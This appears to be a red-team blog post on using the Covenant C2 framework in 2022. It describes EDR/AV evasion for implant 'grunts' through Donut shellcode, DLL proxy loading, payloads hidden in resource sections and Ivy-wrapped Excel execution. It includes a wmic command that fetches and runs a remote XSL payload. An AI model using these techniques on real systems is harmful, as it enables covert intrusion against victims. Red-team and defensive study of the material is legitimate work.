---
layout: post
title: Covenant In 2022
date: '2022-06-07T14:38:00.003-07:00'
author: Matt C
tags: 
modified_time: '2022-06-08T03:23:37.223-07:00'
thumbnail: https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjl0_YYYm_hElr78pekYkJqa2y0eM_mh0rJzzwOxLK6XNHbMRPX0PnpDbPrfTS9iTtrpwImd0r4F5kvkwZifSGADXWPvTdbA2GV5GnIwmjfu6AaZ24GPcm27Ec9EAuI0ZQNmnWEQ2UB3h3TsgaMEOxaRMTOY8F2ObmmfPztsY8U2TC2-uWbFunDyVvA/s72-w506-c-h147/covenant.png
blogger_id: tag:blogger.com,1999:blog-8951407132095927802.post-3336693918662058659
blogger_orig_url: https://cr.culbertreport.com/2022/06/covenant-in-2022.html
---

<div><h1 style="clear: left; float: left; margin-bottom: 1em; margin-left: 1em; text-align: center;">Intro</h1><h2 style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjl0_YYYm_hElr78pekYkJqa2y0eM_mh0rJzzwOxLK6XNHbMRPX0PnpDbPrfTS9iTtrpwImd0r4F5kvkwZifSGADXWPvTdbA2GV5GnIwmjfu6AaZ24GPcm27Ec9EAuI0ZQNmnWEQ2UB3h3TsgaMEOxaRMTOY8F2ObmmfPztsY8U2TC2-uWbFunDyVvA/s1756/covenant.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="510" data-original-width="1756" height="147" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjl0_YYYm_hElr78pekYkJqa2y0eM_mh0rJzzwOxLK6XNHbMRPX0PnpDbPrfTS9iTtrpwImd0r4F5kvkwZifSGADXWPvTdbA2GV5GnIwmjfu6AaZ24GPcm27Ec9EAuI0ZQNmnWEQ2UB3h3TsgaMEOxaRMTOY8F2ObmmfPztsY8U2TC2-uWbFunDyVvA/w506-h147/covenant.png" width="506" /></a></div></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>What great timing, s3cur3th1ssh1t just made a post on<a href="https://s3cur3th1ssh1t.github.io/Covenant_Stageless_HTTP/" rel="nofollow" target="_blank"> stageless vs staged Grunts in Covenant</a>. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate "grunts" that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. <span>Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.<br /></span></p><p></p><h2 style="text-align: left;">How Do The Grunts Hold Up?</h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term "grunt") and that comes in very handy. Moreover, once you've customized a grunt, you can save that as a template so that you won't need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.</p><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;</span></p><p style="text-align: left;"><span></span></p><div class="separator" style="clear: both; text-align: center;"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwLIvPTq8h0rWNDooiN1tTfNIQTO5I3q7TkZfI3mUPghPx-c4NDlO_uewXcWDzIAVt0UfFQP9uR6H8wwalvRVIv-o8YCTl3G1HroJM_nTZOWy_M3gZ5wY8-yjAkt2oUfgTT-eQ2KHKbDkSi5RLXk9195JMuThiFhF4oR08LOperCNCP3Xa6u5gcSMROQ/s1433/default-detection.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="678" data-original-width="1433" height="302" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwLIvPTq8h0rWNDooiN1tTfNIQTO5I3q7TkZfI3mUPghPx-c4NDlO_uewXcWDzIAVt0UfFQP9uR6H8wwalvRVIv-o8YCTl3G1HroJM_nTZOWy_M3gZ5wY8-yjAkt2oUfgTT-eQ2KHKbDkSi5RLXk9195JMuThiFhF4oR08LOperCNCP3Xa6u5gcSMROQ/w639-h302/default-detection.png" width="639" /></a></span></div><span><br /></span><span>&nbsp;&nbsp;&nbsp; </span>Naturally, your next question might be "Is Covenant still worth using?" And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we'll explore some of them below.<br /><p></p><h2 style="text-align: left;">Built-in Evasion Options?</h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use <span style="font-family: courier;">wmic os get /FORMAT:"https://url"</span> to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.</p><p style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP8-DYjFB7JOlddi5zpSC6_mffztkMfYz_4GHtqkZaRDKqX-7AG6qp_TqczwRsNCCPRmJ70EvXZDKhquSwoSB-95Pe7q0PJXyaN-FwAEBRSKF9WvPSMapi0-KgG9jf0W3-b1ihxGZQedoLIzwMv4NyTj3wwp_WDFOpl0CHEc9TE40phiDAJ6jgFmcDUA/s640/donut.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="311" data-original-width="640" height="156" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP8-DYjFB7JOlddi5zpSC6_mffztkMfYz_4GHtqkZaRDKqX-7AG6qp_TqczwRsNCCPRmJ70EvXZDKhquSwoSB-95Pe7q0PJXyaN-FwAEBRSKF9WvPSMapi0-KgG9jf0W3-b1ihxGZQedoLIzwMv4NyTj3wwp_WDFOpl0CHEc9TE40phiDAJ6jgFmcDUA/s320/donut.jpg" width="320" /></a>&nbsp;</p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>Covenant evidently has some well thought out evasion options built into it. It's worth reviewing Donut specifically though for a moment since we'll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. <br /></p><h2 style="text-align: left;">Hiding The Grunts<br /></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don't hold up nearly as well. In 2021/2022, we saw a great advance in EDR's ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we'll review how they work.</p><h4 style="text-align: left;">DLL Proxy Loading</h4><p><span>&nbsp;&nbsp; &nbsp;</span>This method is the least effective out of the three, but least effective doesn't it won't work and it's up against some stiff competition. What this method does is read in the <span style="font-family: courier;">shellcode.bin</span> file and then use <span style="font-family: courier;">VirtualAlloc </span>to allocate a memory region before copying the shellcode contents into it using <span style="font-family: courier;">memcpy</span>. A simple but effective solution.</p><p style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyTVkJpvX8r27iMjx3DP7p_vsOVfQ8Yq3yEG3JdPrds5z4IdDgYygxpfo5_WRKSzgfqKcO9mn2flLOjJ2kXau2Eto3BtpCaNGEt3P7qnI3vaKwqmbNFHfK36T7ySSdMqE4By4gqOzUJtTGU64KzSA1_KMrsQQqjG9NPpQAbfUAvO6H9OCpQZ4rX70Bbw/s515/Utilizing%20local%20file.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="229" data-original-width="515" height="204" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyTVkJpvX8r27iMjx3DP7p_vsOVfQ8Yq3yEG3JdPrds5z4IdDgYygxpfo5_WRKSzgfqKcO9mn2flLOjJ2kXau2Eto3BtpCaNGEt3P7qnI3vaKwqmbNFHfK36T7ySSdMqE4By4gqOzUJtTGU64KzSA1_KMrsQQqjG9NPpQAbfUAvO6H9OCpQZ4rX70Bbw/w459-h204/Utilizing%20local%20file.png" width="459" /></a>&nbsp;</p><p><span>&nbsp;&nbsp; &nbsp;</span>A lot of EDR/AV had trouble identifying and scanning the shellcode file  generated through Donut. But this method has the drawback of needing to  drop the DLL and the shellcode seperately, as opposed to just one application or file. <a href="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/" rel="nofollow" target="_blank">Redteaming.co.uk has a great right up though on doing this here.</a> If you would like to use this technique, it's advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.</p><h4 style="text-align: left;">Hiding Shellcode in the .RSRC Section</h4><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use  to hide their payloads and it's not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! <a href="https://blog.sunggwanchoi.com/covenant-loaders-and-winapi/" rel="nofollow" target="_blank">Find a more detailed write up on this here</a>.&nbsp;</p><p style="text-align: left;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgHuyQXCalIURSI3QWipr-kfmKZ7KtOrY4YAy1ygFXDFi6SGk1JohK4u7Z-oRfNtBReqoTy2X4eIM6D8iI5G4RXXTpsdgD8pDbiSsh7M7hyJ6CvV19vqBXpIFY9hDC6rCO2U9lXgo4N0n2pzyTYDvq3qR9EZRqHnVEbWVsi21pMWbBakbEydynE-MgkA/s725/Utilizing%20Rsrc.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="199" data-original-width="725" height="144" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgHuyQXCalIURSI3QWipr-kfmKZ7KtOrY4YAy1ygFXDFi6SGk1JohK4u7Z-oRfNtBReqoTy2X4eIM6D8iI5G4RXXTpsdgD8pDbiSsh7M7hyJ6CvV19vqBXpIFY9hDC6rCO2U9lXgo4N0n2pzyTYDvq3qR9EZRqHnVEbWVsi21pMWbBakbEydynE-MgkA/w523-h144/Utilizing%20Rsrc.png" width="523" /></a></div><p></p><p style="text-align: left;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6CuseGlMNKa6jppvBS-1BPD1bl8V3rxn-7zrWgEMGAvS-79S7cvco4NBouEF50jY-LHXx940RFuaaWCMdhVyT9UE4VXA1687hyqgC48pWQX6hC9xeQAcZYCuxhYBsTYZwlSfsC8iJV1_sewFhIH32qd_3M2MhgCDCFBkRw-RORKXj2g0ulxTpUJAcyQ/s725/import%20-%20g%20ico.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="154" data-original-width="725" height="110" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6CuseGlMNKa6jppvBS-1BPD1bl8V3rxn-7zrWgEMGAvS-79S7cvco4NBouEF50jY-LHXx940RFuaaWCMdhVyT9UE4VXA1687hyqgC48pWQX6hC9xeQAcZYCuxhYBsTYZwlSfsC8iJV1_sewFhIH32qd_3M2MhgCDCFBkRw-RORKXj2g0ulxTpUJAcyQ/w519-h110/import%20-%20g%20ico.png" width="519" /></a></div><p></p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it's a simple executable that a user can start.<span>&nbsp;</span></p><p></p><h4 style="text-align: left;"><span>Evasion With Ivy</span></h4><h2 style="text-align: left;"><span><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaMMbzv9vgj_OhHACm3QTp4DhXpYikKgxZNHnlNC1Bg45VX_v2OmZl22ior8bk3iKqakvQgY3RtV9B6jx1VFpL3YNlz4SOe3zaeDydWfkDvk2GRKUj4b0dD0Bxr0xdt6yba9V9r_1YO_ECWGH93A47gif4hsRrDwG69CHmyETOjLR_IKA6b8EHT_XjiQ/s300/ivy.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="300" data-original-width="300" height="300" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaMMbzv9vgj_OhHACm3QTp4DhXpYikKgxZNHnlNC1Bg45VX_v2OmZl22ior8bk3iKqakvQgY3RtV9B6jx1VFpL3YNlz4SOe3zaeDydWfkDvk2GRKUj4b0dD0Bxr0xdt6yba9V9r_1YO_ECWGH93A47gif4hsRrDwG69CHmyETOjLR_IKA6b8EHT_XjiQ/s1600/ivy.png" width="300" /></a></div></span></h2><span><span>&nbsp;&nbsp;&nbsp; The third method for evasion, and it's one of my favorites. </span>Ivy is a payload generation tool developed by Optiv. If you haven't heard of it before, you should <a href="https://github.com/optiv/Ivy">read more about it here</a>. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it's own version of <span style="font-family: courier;">WriteProcessMemory</span>. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.</span><br /><span><span>&nbsp;&nbsp;&nbsp; </span>Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. </span><br /><br /></div><div style="text-align: center;"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghoZAk9jw8OO-QWnwJnjh-oVy2ZcsnQ6l-3fU5Ab5aQ0bF3HwMMWvm72DD73cR_2DzuX_jtOQvgTJw6PDqJHSAokTzXPusZQBYgw1NAita6fm-4TP6WKHGAha3cpyxifwGoEadXjw8XL3TCq-Dk864VCanBPRSc5AkGmbRmniycvIvsPFPz18m58Rv5A/s705/Ivy%20Payload.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="375" data-original-width="705" height="253" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghoZAk9jw8OO-QWnwJnjh-oVy2ZcsnQ6l-3fU5Ab5aQ0bF3HwMMWvm72DD73cR_2DzuX_jtOQvgTJw6PDqJHSAokTzXPusZQBYgw1NAita6fm-4TP6WKHGAha3cpyxifwGoEadXjw8XL3TCq-Dk864VCanBPRSc5AkGmbRmniycvIvsPFPz18m58Rv5A/w476-h253/Ivy%20Payload.png" width="476" /></a></span><br /></div><div><br /><span><span>&nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;</span></span><br /><span><span></span></span><br /><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjGEa4oFO4RjxBA4K2kzA3jPrtDYWvWFmsIc8qTuthC-GRULkDlAE67mEVTxtQP6gqF0sGtx72FUfmCkPWmObQrh3glW1ZSRk9DII7h2ToOmPaidJqCOI235ZfL4axEMPgLrsSktm0sMAvpr1CAHiObyl-EE65g2nSGhYX7L1cXSHbdkgDyOUV5o_m6w/s2304/Untitled.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="568" data-original-width="2304" height="156" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjGEa4oFO4RjxBA4K2kzA3jPrtDYWvWFmsIc8qTuthC-GRULkDlAE67mEVTxtQP6gqF0sGtx72FUfmCkPWmObQrh3glW1ZSRk9DII7h2ToOmPaidJqCOI235ZfL4axEMPgLrsSktm0sMAvpr1CAHiObyl-EE65g2nSGhYX7L1cXSHbdkgDyOUV5o_m6w/w631-h156/Untitled.png" width="631" /></a></span><br /><br /><br /><span><span>&nbsp;&nbsp; &nbsp;</span>Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in.</span></div><div><span>&nbsp;</span><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgj-R4OZz7IZKvXTibpPUVBtropg4_pOoEf2TAJSAGFlgRUKv2BNTpYYqkb9noHm8IrMItB35ExzldGiG-jG_zIQ6TLbtomPkZ3R6xpz_tZMeJUDdxrk-CPf4X9JsIWnqBVQexAUfJmwntCxM2JpCqf2Cw962poR2RDkWDhf-H0kXLhZYAKTuprYp-FTQ/s1360/ivy-grunt-checkin.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="433" data-original-width="1360" height="197" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgj-R4OZz7IZKvXTibpPUVBtropg4_pOoEf2TAJSAGFlgRUKv2BNTpYYqkb9noHm8IrMItB35ExzldGiG-jG_zIQ6TLbtomPkZ3R6xpz_tZMeJUDdxrk-CPf4X9JsIWnqBVQexAUfJmwntCxM2JpCqf2Cw962poR2RDkWDhf-H0kXLhZYAKTuprYp-FTQ/w620-h197/ivy-grunt-checkin.png" width="620" /></a></div><p></p><h2 style="text-align: left;"><span>Lessons Learned &nbsp;&nbsp; </span><br /></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.<br /></p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire.<br /></p></div>